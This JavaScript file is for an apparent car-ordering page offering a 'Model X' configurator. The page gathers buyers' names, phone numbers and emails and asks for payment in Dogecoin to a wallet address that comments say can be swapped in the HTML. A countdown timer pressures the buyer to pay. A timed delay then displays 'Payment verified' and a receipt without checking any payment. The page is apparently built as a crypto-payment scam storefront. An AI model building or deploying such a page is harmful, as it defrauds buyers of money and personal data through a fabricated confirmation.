const images = {
  overview: "images/model x/10103.jpg",
  colors: {
    white: "images/model x/10104.jpg",
    grey: "images/model x/10105.jpeg",
    red: "images/model x/10106.jpg",
    blue: "images/model x/10101.jpg",
    silver: "images/model x/10102.jpg",
    black: "images/model x/10100.jpg"
  },
  interior: {
    black: "images/model x/10090.jpeg",
    white: "images/model x/Image02.jpeg",
    cream: "images/model x/10079.jpeg"
  },
  wheels: {
    standard: "images/model x/10105.jpeg",
    sport: "images/model x/Model X standard wheel.jpeg"
  },
};
let selectedColor = "white";
let selectedWheel = "standard";
let selectedInterior = "black";

function setImage(imgSrc) {
  document.getElementById("main-image").src = imgSrc;
}

// Color Selector
const colorOpts = {
  white: "#f3f3f3ff",
  grey: "#2b2b2bff",
  red: "#ce3030ff",
  blue: "#353ec7ff",
  silver: "#dfdfdfff",
  black: "#000000ff"
};
const colorOptionsDiv = document.querySelector(".color-options");
Object.keys(colorOpts).forEach((key, idx) => {
  const btn = document.createElement("button");
  btn.className = "color-btn" + (idx === 0 ? " selected" : "");
  btn.style.background = colorOpts[key];
  btn.title = key.charAt(0).toUpperCase() + key.slice(1);
  btn.onclick = () => {
    selectedColor = key;
    document.querySelectorAll(".color-btn").forEach(b => b.classList.remove("selected"));
    btn.classList.add("selected");
    setImage(images.colors[selectedColor]);
    updateSummary();
  };
  colorOptionsDiv.appendChild(btn);
});


// Wheel Selector
const wheelOpts = {
  standard: "#bfc3c6",
  sport: "#444"
};
const wheelOptionsDiv = document.querySelector(".wheel-options");
Object.keys(wheelOpts).forEach((key, idx) => {
  const btn = document.createElement("button");
  btn.className = "wheel-btn" + (idx === 0 ? " selected" : "");
  btn.style.background = wheelOpts[key];
  btn.title = key.charAt(0).toUpperCase() + key.slice(1) + " Wheels";
  btn.onclick = () => {
    selectedWheel = key;
    document.querySelectorAll(".wheel-btn").forEach(b => b.classList.remove("selected"));
    btn.classList.add("selected");
    setImage(images.wheels[selectedWheel]);
    updateSummary();
  };
  wheelOptionsDiv.appendChild(btn);
});

// Interior Selector
const interiorOpts = {
  black: "#18191a",
  white: "#e6e7ea",
  cream: "#e2ceae"
};
const interiorOptionsDiv = document.querySelector(".interior-options");
Object.keys(interiorOpts).forEach((key, idx) => {
  const btn = document.createElement("button");
  btn.className = "interior-btn" + (idx === 0 ? " selected" : "");
  btn.style.background = interiorOpts[key];
  btn.title = key.charAt(0).toUpperCase() + key.slice(1) + " Interior";
  btn.onclick = () => {
    selectedInterior = key;
    document.querySelectorAll(".interior-btn").forEach(b => b.classList.remove("selected"));
    btn.classList.add("selected");
    setImage(images.interior[selectedInterior]);
    updateSummary();
  };
  interiorOptionsDiv.appendChild(btn);
});

// Scroll-based image switching (replaced)
const configPanel = document.getElementById("config-panel");
const configSections = Array.from(document.querySelectorAll(".config-section"));
let activeSectionIndex = 0;

function imageForIndex(idx) {
  if (idx === 0) return images.overview;
  if (idx === 1) return images.colors[selectedColor];
  if (idx === 2) return images.wheels[selectedWheel];
  if (idx === 3) return images.interior[selectedInterior];
  return images.overview;
}

function updateImageForActiveSection(idx) {
  activeSectionIndex = idx;
  setImage(imageForIndex(idx) || images.overview);
}

// Prefer IntersectionObserver for reliable detection inside the scrolling panel
if (window.IntersectionObserver && configPanel && configSections.length) {
  const observer = new IntersectionObserver((entries) => {
    // pick the entry with the largest intersectionRatio
    let best = entries.reduce((a, b) => (a.intersectionRatio > b.intersectionRatio ? a : b), entries[0]);
    if (best && best.isIntersecting) {
      const idx = configSections.indexOf(best.target);
      if (idx !== -1) updateImageForActiveSection(idx);
    }
  }, {
    root: configPanel,
    threshold: [0.25, 0.5, 0.75, 1]
  });
  configSections.forEach(s => observer.observe(s));
  // start showing overview
  updateImageForActiveSection(0);
} else {
  // fallback: compute section whose midpoint is closest to panel midpoint
  function handleScroll() {
    const panelRect = configPanel.getBoundingClientRect();
    const mid = panelRect.top + panelRect.height / 2;
    let bestIdx = 0, bestDist = Infinity;
    configSections.forEach((sec, i) => {
      const rect = sec.getBoundingClientRect();
      const secMid = rect.top + rect.height / 2;
      const dist = Math.abs(secMid - mid);
      if (dist < bestDist) { bestDist = dist; bestIdx = i; }
    });
    updateImageForActiveSection(bestIdx);
  }
  configPanel.addEventListener('scroll', handleScroll, { passive: true });
  updateImageForActiveSection(0);
}

// Ensure when user changes a selection while its section is visible the image updates
// (selection handlers already call setImage, but re-apply correct image if the active section is the related one)
const originalUpdateSummary = updateSummary;
updateSummary = function() {
  originalUpdateSummary();
  // if user is currently viewing the exterior/wheels/interior section, refresh image to reflect the new choice
  if (activeSectionIndex === 1) setImage(images.colors[selectedColor]);
  if (activeSectionIndex === 2) setImage(images.wheels[selectedWheel]);
  if (activeSectionIndex === 3) setImage(images.interior[selectedInterior]);
};


// Summary
function updateSummary() {
  document.getElementById("summary-content").innerHTML =
    `<strong>Exterior:</strong> ${selectedColor.charAt(0).toUpperCase()+selectedColor.slice(1)}<br>` +
    `<strong>Wheels:</strong> ${selectedWheel.charAt(0).toUpperCase()+selectedWheel.slice(1)}<br>` +
    `<strong>Interior:</strong> ${selectedInterior.charAt(0).toUpperCase()+selectedInterior.slice(1)}`;
}
updateSummary();

  (function(){
    const STORAGE_KEY = 'pp_application';
    const DURATION_MS = 1 * 60  * 60 * 1000; // 30 minutes

  const form = document.getElementById('app-form');
  const guideline = document.getElementById('payment-guideline');
  const walletEl = document.getElementById('wallet-address');
  // capture the wallet value from the DOM on load — this lets editing the HTML wallet address take effect immediately
  const DEFAULT_WALLET = (walletEl && walletEl.textContent && walletEl.textContent.trim()) ? walletEl.textContent.trim() : '0xDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEAD1234';
  const countdownEl = document.getElementById('countdown');
  const statusEl = document.getElementById('payment-status');
  const doneBtn = document.getElementById('done-btn');
  const closeBtn = document.getElementById('close-guideline-btn');

    // new confirmed section elements
    const confirmedSection = document.getElementById('payment-confirmed');
    const confirmedContent = document.getElementById('confirmed-content');
    const confirmedOkBtn = document.getElementById('confirmed-ok-btn');

    // Copy wallet address button and feedback
    const copyBtn = document.getElementById('copy-wallet-btn');
    const copyFeedback = document.getElementById('copy-feedback');
    function copyTextToClipboard(text) {
      if (!text) return Promise.reject(new Error('No text to copy'));
      // modern clipboard API
      if (navigator.clipboard && navigator.clipboard.writeText) {
        return navigator.clipboard.writeText(text);
      }
      // fallback for older browsers
      return new Promise((resolve, reject) => {
        const textarea = document.createElement('textarea');
        textarea.value = text;
        textarea.setAttribute('readonly', '');
        textarea.style.position = 'absolute';
        textarea.style.left = '-9999px';
        document.body.appendChild(textarea);
        textarea.select();
        try {
          const ok = document.execCommand('copy');
          document.body.removeChild(textarea);
          if (ok) resolve(); else reject(new Error('execCommand failed'));
        } catch (err) {
          document.body.removeChild(textarea);
          reject(err);
        }
      });
    }

    if (copyBtn) {
      copyBtn.addEventListener('click', function () {
        const addr = (walletEl && walletEl.textContent) ? walletEl.textContent.trim() : '';
        if (!addr) return;
        copyBtn.disabled = true;
        copyTextToClipboard(addr).then(() => {
          if (copyFeedback) copyFeedback.textContent = 'Copied!';
          setTimeout(() => { if (copyFeedback) copyFeedback.textContent = ''; }, 2500);
        }).catch(() => {
          if (copyFeedback) copyFeedback.textContent = 'Copy failed. Select and copy manually.';
          setTimeout(() => { if (copyFeedback) copyFeedback.textContent = ''; }, 3500);
        }).finally(() => { copyBtn.disabled = false; });
      });
    }

    let timerId = null;

    function now() { return Date.now(); }

    function saveApplication(data) {
      localStorage.setItem(STORAGE_KEY, JSON.stringify(data));
    }

    function loadApplication() {
      const raw = localStorage.getItem(STORAGE_KEY);
      if (!raw) return null;
      try { return JSON.parse(raw); } catch(e){ return null; }
    }

    function clearApplication() {
      localStorage.removeItem(STORAGE_KEY);
    }

    function showGuideline(data) {
      guideline.style.display = '';
      // Prefer the DOM-provided wallet address (DEFAULT_WALLET) unless an explicit wallet is provided in data.
      // This ensures editing the wallet in the HTML will be reflected immediately even if localStorage has older data.
      walletEl.textContent = (data && data.wallet) ? data.wallet : DEFAULT_WALLET;
      startCountdown(data && data.expireAt);
    }

    function hideGuideline() {
      guideline.style.display = 'none';
      statusEl.textContent = '';
      stopCountdown();
    }

    function showConfirmed(data) {
  // compute a DOGE amount (simple example: base + small modifiers)
  function computeAmountDOGE() {
    let amount = 7726.26; // base DOGE
    const colorAdj = { red: 200, blue: 150, silver: 100, black: 300, grey: 0, white: 0 };
    const wheelAdj = { sport: 250, standard: 0 };
    const interiorAdj = { cream: 100, white: 50, black: 0 };
    amount += (colorAdj[selectedColor] || 0) + (wheelAdj[selectedWheel] || 0) + (interiorAdj[selectedInterior] || 0);
    return amount;
  }

  // build confirmation details
  const orderId = 'ORD-' + Math.random().toString(36).slice(2,9).toUpperCase();
  const timestamp = new Date().toLocaleString();
  const wallet = data?.wallet || walletEl.textContent;
  const name = (data?.first && data?.last) ? `${data.first} ${data.last}` : '—';
  const email = data?.email || '—';
  const exterior = selectedColor.charAt(0).toUpperCase() + selectedColor.slice(1);
  const wheels = selectedWheel.charAt(0).toUpperCase() + selectedWheel.slice(1);
  const interior = selectedInterior.charAt(0).toUpperCase() + selectedInterior.slice(1);
  const amountDoge = computeAmountDOGE();

  confirmedContent.innerHTML = `
    <div class="confirm-row"><div class="confirm-label">Order ID</div><div class="confirm-value">${orderId}</div></div>
    <div class="confirm-row"><div class="confirm-label">Name</div><div class="confirm-value">${name}</div></div>
    <div class="confirm-row"><div class="confirm-label">E-mail</div><div class="confirm-value">${email}</div></div>
    <div class="confirm-row"><div class="confirm-label">Exterior</div><div class="confirm-value">${exterior}</div></div>
    <div class="confirm-row"><div class="confirm-label">Wheels</div><div class="confirm-value">${wheels}</div></div>
    <div class="confirm-row"><div class="confirm-label">Interior</div><div class="confirm-value">${interior}</div></div>
    <div class="confirm-row"><div class="confirm-label">Paid to</div><div class="confirm-value">${wallet}</div></div>
    <div class="confirm-row"><div class="confirm-label">Amount (DOGE)</div><div class="confirm-value">${amountDoge} DOGE</div></div>
    <div class="confirm-row"><div class="confirm-label">Confirmed</div><div class="confirm-value">${timestamp}</div></div>
    <p style="margin-top:8px;color:var(--muted)">A receipt has been generated for your records. Keep your Order ID for any support inquiries.</p>
  `;
  confirmedSection.style.display = '';
  // scroll the config panel so the user sees confirmation (if available)
  const configPanel = document.getElementById('config-panel');
  if (configPanel) configPanel.scrollTop = Array.from(configPanel.children).indexOf(confirmedSection) * 200;
}


    function hideConfirmed() {
      confirmedSection.style.display = 'none';
      confirmedContent.innerHTML = '';
    }

    // ...existing code...
    function startCountdown(expireAt) {
      // guard: don't start if expireAt is missing/invalid
      if (!expireAt || expireAt <= now()) return;

      stopCountdown();

      function updateCountdown() {
        const ms = expireAt - now();
        if (ms <= 0) {
          stopCountdown();
          clearApplication();
          hideGuideline();
          alert('Payment window expired. Please submit your application again to see the payment guideline.');
          return;
        }
        const totalSec = Math.floor(ms / 1000);
        const minutes = String(Math.floor(totalSec / 60)).padStart(2,'0');
        const seconds = String(totalSec % 60).padStart(2,'0');
        countdownEl.textContent = minutes + ':' + seconds;
      }

      // run once immediately then every second
      updateCountdown();
      timerId = setInterval(updateCountdown, 1000);
    }
// ...existing code...
    (function init() {
      const saved = loadApplication();
      // If the page's wallet address (DEFAULT_WALLET) was edited in the HTML,
      // keep the saved application in sync so the displayed wallet matches what you see in the DOM.
      if (saved && DEFAULT_WALLET && saved.wallet !== DEFAULT_WALLET) {
        saved.wallet = DEFAULT_WALLET;
        saveApplication(saved);
      }
      // Do not auto-show the payment guideline on page load.
      // Keep saved data so the user can resume, but only show/start countdown
      // when they actively submit ("Order Now").
      if (!(saved && saved.expireAt && saved.expireAt > now())) {
        clearApplication();
      }
    })();
// ...existing code...

    function stopCountdown() {
      if (timerId) { clearInterval(timerId); timerId = null; }
    }

    // initialize on load: if saved and not expired, show guideline
    (function init() {
      const saved = loadApplication();
      // sync wallet on load so any HTML edits are reflected immediately
      if (saved && DEFAULT_WALLET && saved.wallet !== DEFAULT_WALLET) {
        saved.wallet = DEFAULT_WALLET;
        saveApplication(saved);
      }
      if (saved && saved.expireAt && saved.expireAt > now()) {
        showGuideline(saved);
      } else {
        clearApplication();
      }
    })();

    form.addEventListener('submit', function(e){
      e.preventDefault();
      if (!form.checkValidity()) {
        form.reportValidity();
        return;
      }
      const data = {
        zip: document.getElementById('delivery-zip').value.trim(),
        postal: document.getElementById('postal-code').value.trim(),
        first: document.getElementById('first').value.trim(),
        last: document.getElementById('last').value.trim(),
        mobile: document.getElementById('mobile').value.trim(),
        email: document.getElementById('email').value.trim(),
        wallet: walletEl.textContent || 'DFMiNUCikU5Te5MaUH8DELjmNoYYepxveW',
        createdAt: now(),
        expireAt: now() + DURATION_MS
      };
      saveApplication(data);
      showGuideline(data);
    });

    doneBtn.addEventListener('click', function(){
      // load stored application (to include in confirmation)
      const app = loadApplication();
      // show immediate feedback
      statusEl.textContent = 'Verifying payment...';
      doneBtn.disabled = true;
      closeBtn.disabled = true;

      // simulate verification (replace with real verification flow when available)
      setTimeout(() => {
        statusEl.textContent = 'Payment verified.';
        // clear stored application now that it's confirmed
        clearApplication();
        stopCountdown();
        // hide guideline and show confirmed section with app info
        hideGuideline();
        showConfirmed(app || {});
        // reset status and re-enable controls
        statusEl.textContent = '';
        doneBtn.disabled = false;
        closeBtn.disabled = false;
      }, 900000);
    });

    closeBtn.addEventListener('click', function(){
      // allow closing guideline without clearing stored data
      hideGuideline();
    });

    confirmedOkBtn.addEventListener('click', function(){
      hideConfirmed();
      // optionally update summary to reflect final order
      updateSummary();
    });

    // expose for debugging in console (optional)
    window._pp = { loadApplication, saveApplication, clearApplication, showConfirmed, hideConfirmed };
  })();

// ...existing code...
// Initial

// ...existing code...
// inject transition CSS for the main image (only once)
(function injectImageTransitionStyles(){
  const css = `
    #main-image.fade-transition {
      transition: opacity 320ms ease, transform 320ms ease;
      will-change: opacity, transform;
      display: block;
    }
    #main-image.fade-out { opacity: 0; transform: scale(0.995); }
    #main-image.fade-in  { opacity: 1; transform: none; }
  `;
  const s = document.createElement('style');
  s.setAttribute('data-injected-by','pp-image-transitions');
  s.textContent = css;
  document.head.appendChild(s);
})();

// enhanced setImage with cross-fade on change
function setImage(imgSrc) {
  const img = document.getElementById("main-image");
  if (!img) return;
  // avoid unnecessary work if requested src is already the current dataset value
  if (img.dataset.current === imgSrc) return;
  img.dataset.current = imgSrc;

  // ensure the transition class is present
  img.classList.add('fade-transition');

  // If image is currently visible, fade out first, swap src on transition end, then fade in.
  // If no current src (first load), set src and fade in.
  const currentOpacity = window.getComputedStyle(img).opacity;
  const durationFallback = 400; // ms

  function applySrcAndFadeIn() {
    // set new src; wait a frame and then fade in
    img.src = imgSrc;
    requestAnimationFrame(() => {
      // remove any leftover fade-out then add fade-in
      img.classList.remove('fade-out');
      img.classList.add('fade-in');
    });
  }

  // If image appears already loaded and visible, do fade-out -> swap -> fade-in
  if (currentOpacity && Number(currentOpacity) > 0.01 && img.src) {
    // start fade-out
    img.classList.remove('fade-in');
    img.classList.add('fade-out');

    const onTransitionEnd = (ev) => {
      if (ev.propertyName !== 'opacity') return;
      img.removeEventListener('transitionend', onTransitionEnd);
      applySrcAndFadeIn();
    };
    img.addEventListener('transitionend', onTransitionEnd);

    // safety fallback if transitionend doesn't fire
    setTimeout(() => {
      // if still in fade-out state, force swap and fade-in
      if (img.classList.contains('fade-out')) {
        img.removeEventListener('transitionend', onTransitionEnd);
        applySrcAndFadeIn();
      }
    }, durationFallback);
  } else {
    // initial load or invisible: just set and fade in
    img.classList.remove('fade-out');
    applySrcAndFadeIn();
  }
}
// Initial image
setImage(images.overview);

